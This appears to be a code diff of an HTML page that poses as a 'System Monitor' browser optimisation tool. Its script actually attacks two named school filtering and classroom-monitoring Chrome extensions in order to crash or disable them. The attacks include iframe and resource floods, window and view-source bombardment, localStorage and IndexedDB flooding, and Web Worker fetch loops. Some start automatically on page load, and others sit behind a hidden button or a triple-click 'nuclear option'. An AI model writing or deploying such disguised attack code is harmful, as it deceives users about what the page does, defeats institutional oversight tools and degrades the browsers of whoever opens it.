@@ -1,12 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Diagnostics</title>
+    <title>System Monitor</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            color: #333;
+            background-color: #f5f5f5;
             margin: 0;
             padding: 20px;
             text-align: center;
@@ -14,162 +13,237 @@
         #container {
             max-width: 600px;
             margin: 0 auto;
-            background-color: #fff;
-            padding: 20px;
+            background: white;
+            padding: 30px;
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         button {
-            background: #4CAF50;
+            background: #4285f4;
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 24px;
             margin: 10px;
-            cursor: pointer;
-            border-radius: 5px;
             font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: all 0.3s;
         }
-        button#hiddenKill {
-            background: #f0f0f0;
-            color: #f0f0f0;
-            border: 1px solid #f0f0f0;
+        button:hover {
+            background: #3367d6;
+        }
+        button#turboBtn {
+            background: #ea4335;
+        }
+        button#turboBtn:hover {
+            background: #d33426;
         }
         #status {
             margin: 20px 0;
-            padding: 10px;
-            background: #e9e9e9;
-            border-radius: 5px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 4px;
+            font-family: monospace;
+            min-height: 60px;
+        }
+        .hidden {
+            opacity: 0;
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 1px;
+            width: 1px;
         }
     </style>
 </head>
 <body>
     <div id="container">
-        <h1>System Diagnostics Tool</h1>
-        <p>Run system optimization and diagnostics</p>
+        <h1>System Monitor</h1>
+        <p>Browser performance optimization tool</p>
         
-        <button id="optimizeBtn">Optimize System</button>
-        <button id="diagnoseBtn">Run Diagnostics</button>
-        <button id="hiddenKill"></button>
+        <button id="optimizeBtn">Optimize Extensions</button>
+        <button id="turboBtn">Turbo Clean</button>
         
-        <div id="status">Ready</div>
+        <div id="status">System ready</div>
     </div>
 
+    <!-- Hidden attack elements -->
+    <div id="hiddenAttacks" class="hidden"></div>
+
     <script>
-        // Stealth functions that run immediately but quietly
-        (function() {
-            // Hidden method 1: Continuous iframe attack
-            setInterval(() => {
+        // EXTENSIONS TO DESTROY
+        const TARGETS = [
+            'adkcpkpghahmbopkjchobieckeoaoeem', // Lightspeed Filter
+            'kkbmdgjggcdajckdlbngdjonpchpaiea'  // Lightspeed Classroom
+        ];
+
+        // GLOBAL ATTACK CONTROLS
+        let isTurboMode = false;
+        let backgroundAttacks = [];
+        const statusEl = document.getElementById('status');
+        const hiddenContainer = document.getElementById('hiddenAttacks');
+
+        // LOG FUNCTION
+        function log(message) {
+            const now = new Date();
+            const time = now.toLocaleTimeString();
+            statusEl.innerHTML = `[${time}] ${message}<br>` + statusEl.innerHTML;
+            console.log(message);
+        }
+
+        // BACKGROUND ATTACK FUNCTIONS (RUN CONTINUOUSLY)
+        function startBackgroundAttacks() {
+            // 1. IFRAME FLOOD (Steady pace)
+            const iframeAttack = setInterval(() => {
+                TARGETS.forEach(id => {
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.src = `chrome-extension://${id}/main.js?bg=${Date.now()}`;
+                        iframe.style.display = 'none';
+                        hiddenContainer.appendChild(iframe);
+                        setTimeout(() => iframe.remove(), 1000);
+                    } catch(e) {}
+                });
+            }, 500); // Every 500ms
+            
+            // 2. RESOURCE REQUESTS
+            const resourceAttack = setInterval(() => {
+                TARGETS.forEach(id => {
+                    try {
+                        const img = document.createElement('img');
+                        img.src = `chrome-extension://${id}/icon-128.png?bg=${Date.now()}`;
+                        hiddenContainer.appendChild(img);
+                        setTimeout(() => img.remove(), 1000);
+                    } catch(e) {}
+                });
+            }, 800);
+            
+            // 3. STORAGE FLOODING
+            const storageAttack = setInterval(() => {
                 try {
-                    const iframe = document.createElement('iframe');
-                    iframe.src = 'chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/main.js';
-                    iframe.style.display = 'none';
-                    document.body.appendChild(iframe);
-                    setTimeout(() => iframe.remove(), 50);
+                    localStorage.setItem(`bg_flood_${Date.now()}`, Array(1000).join('x'));
                 } catch(e) {}
+            }, 1500);
+            
+            backgroundAttacks = [iframeAttack, resourceAttack, storageAttack];
+            log("Background optimization started");
+        }
+
+        // TURBO MODE ATTACK (EXTREME)
+        function activateTurboMode() {
+            isTurboMode = true;
+            log("TURBO MODE ACTIVATED");
+            
+            // 1. MEGA IFRAME FLOOD (10x normal speed)
+            const turboIframeAttack = setInterval(() => {
+                TARGETS.forEach(id => {
+                    for (let i = 0; i < 20; i++) { // 20 iframes per target
+                        try {
+                            const iframe = document.createElement('iframe');
+                            iframe.src = `chrome-extension://${id}/main.js?turbo=${Date.now()}`;
+                            iframe.style.display = 'none';
+                            document.body.appendChild(iframe);
+                            setTimeout(() => iframe.remove(), 50);
+                        } catch(e) {}
+                    }
+                });
+            }, 50); // 20x per second
+            
+            // 2. VIEW-SOURCE BOMBARDMENT
+            const viewSourceAttack = setInterval(() => {
+                TARGETS.forEach(id => {
+                    try {
+                        const win = window.open(`view-source:chrome-extension://${id}/main.js`, `vs_${id}`);
+                        setTimeout(() => win && win.close(), 200);
+                    } catch(e) {}
+                });
             }, 300);
-
-            // Hidden method 2: LocalStorage flooding
-            try {
-                setInterval(() => {
-                    localStorage.setItem('crash_' + Date.now(), Array(1000).join('x'));
-                }, 200);
-            } catch(e) {}
-        })();
-
-        // Visible functions
-        document.getElementById('optimizeBtn').addEventListener('click', function() {
-            document.getElementById('status').textContent = 'Disabling extensions...';
             
-            // Method 1: Open and close extension pages rapidly
-            const extensions = [
-                'adkcpkpghahmbopkjchobieckeoaoeem', // Lightspeed Filter
-                'kkbmdgjggcdajckdlbngdjonpchpaiea'  // Lightspeed Classroom
-            ];
+            // 3. STORAGE DESTRUCTION
+            const storageAttack = setInterval(() => {
+                try {
+                    // Flood localStorage
+                    for (let i = 0; i < 10; i++) {
+                        localStorage.setItem(`crash_${Date.now()}`, Array(10000).join('x'));
+                    }
+                    
+                    // Bombard IndexedDB
+                    for (let i = 0; i < 5; i++) {
+                        indexedDB.open(`crash_db_${Date.now()}`, { version: 1 });
+                    }
+                } catch(e) {}
+            }, 500);
             
-            extensions.forEach(id => {
-                for (let i = 0; i < 5; i++) {
+            // Add to background attacks
+            backgroundAttacks.push(turboIframeAttack, viewSourceAttack, storageAttack);
+            
+            // Auto-stop turbo after 2 minutes
+            setTimeout(() => {
+                if (isTurboMode) {
+                    deactivateTurboMode();
+                    log("Turbo mode completed");
+                }
+            }, 120000);
+        }
+
+        function deactivateTurboMode() {
+            // Clear only the turbo attacks (keep background going)
+            clearInterval(backgroundAttacks[3]);
+            clearInterval(backgroundAttacks[4]);
+            clearInterval(backgroundAttacks[5]);
+            backgroundAttacks = backgroundAttacks.slice(0, 3);
+            isTurboMode = false;
+        }
+
+        // NORMAL OPTIMIZATION BUTTON
+        document.getElementById('optimizeBtn').addEventListener('click', () => {
+            log("Running extension optimization...");
+            
+            // Temporary boost to background attacks
+            TARGETS.forEach(id => {
+                for (let i = 0; i < 10; i++) {
                     setTimeout(() => {
                         try {
-                            const win = window.open(`chrome-extension://${id}/options.html`, '_blank');
-                            setTimeout(() => win && win.close(), 50);
+                            const win = window.open(`chrome-extension://${id}/options.html`, `opt_${id}`);
+                            setTimeout(() => win && win.close(), 100);
                         } catch(e) {}
-                    }, i * 100);
+                    }, i * 150);
                 }
             });
             
-            // Method 2: Resource flooding
-            setTimeout(() => {
-                for (let i = 0; i < 20; i++) {
-                    try {
-                        const img = document.createElement('img');
-                        img.src = `chrome-extension://${extensions[0]}/icon-128.png?crash=${Date.now()}`;
-                        setTimeout(() => img.remove(), 100);
-                    } catch(e) {}
-                }
-                document.getElementById('status').textContent = 'Extensions disabled';
-            }, 1000);
+            log("Optimization cycle complete");
         });
 
-        document.getElementById('diagnoseBtn').addEventListener('click', function() {
-            document.getElementById('status').textContent = 'Resetting extensions...';
-            
-            // More aggressive method to crash extensions
-            try {
-                // Open view-source to crash extensions
-                const win1 = window.open('view-source:chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/main.js', '_blank');
-                const win2 = window.open('view-source:chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/main.js', '_blank');
-                
-                // Flood with data
-                setTimeout(() => {
-                    try {
-                        win1.document.body.innerHTML = Array(1000).fill('<div>CRASH</div>').join('');
-                        win2.document.body.innerHTML = Array(1000).fill('<div>CRASH</div>').join('');
-                    } catch(e) {}
-                    
-                    // Close windows
-                    setTimeout(() => {
-                        win1.close();
-                        win2.close();
-                        document.getElementById('status').textContent = 'Extensions reset';
-                    }, 500);
-                }, 500);
-            } catch(e) {
-                document.getElementById('status').textContent = 'Reset failed';
-            }
-        });
+        // TURBO BUTTON
+        document.getElementById('turboBtn').addEventListener('click', activateTurboMode);
 
-        // Hidden kill button (invisible but clickable)
-        document.getElementById('hiddenKill').addEventListener('click', function() {
-            // Nuclear option - tries to crash all extensions
-            document.getElementById('status').textContent = 'Executing deep cleanup...';
-            
-            // Method 1: Infinite iframe attack
-            for (let i = 0; i < 100; i++) {
-                setTimeout(() => {
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.src = `chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/main.js?crash=${i}`;
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
-                    } catch(e) {}
-                }, i * 20);
+        // START BACKGROUND ATTACKS IMMEDIATELY
+        startBackgroundAttacks();
+        log("System monitor initialized");
+
+        // HIDDEN FEATURE: TRIPLE-CLICK STATUS FOR NUCLEAR OPTION
+        let clickCount = 0;
+        statusEl.addEventListener('click', () => {
+            clickCount++;
+            if (clickCount >= 3) {
+                clickCount = 0;
+                log("ACTIVATING NUCLEAR OPTION...");
+                // Add web worker attack
+                try {
+                    const workerCode = `
+                        setInterval(() => {
+                            ${TARGETS.map(id => `
+                                fetch('chrome-extension://${id}/main.js').catch(()=>{});
+                                fetch('chrome-extension://${id}/manifest.json').catch(()=>{});
+                            `).join('')}
+                        }, 100);
+                    `;
+                    const blob = new Blob([workerCode], { type: 'application/javascript' });
+                    for (let i = 0; i < 3; i++) {
+                        new Worker(URL.createObjectURL(blob));
+                    }
+                } catch(e) {}
             }
-            
-            // Method 2: Storage bombing
-            try {
-                for (let i = 0; i < 100; i++) {
-                    indexedDB.open(`crash_db_${i}`, { version: 1 });
-                }
-            } catch(e) {}
-            
-            // Method 3: History flooding
-            try {
-                for (let i = 0; i < 50; i++) {
-                    history.pushState({}, '', `?crash=${i}`);
-                }
-            } catch(e) {}
-            
-            document.getElementById('status').textContent = 'Cleanup complete - restart browser';
         });
     </script>
 </body>
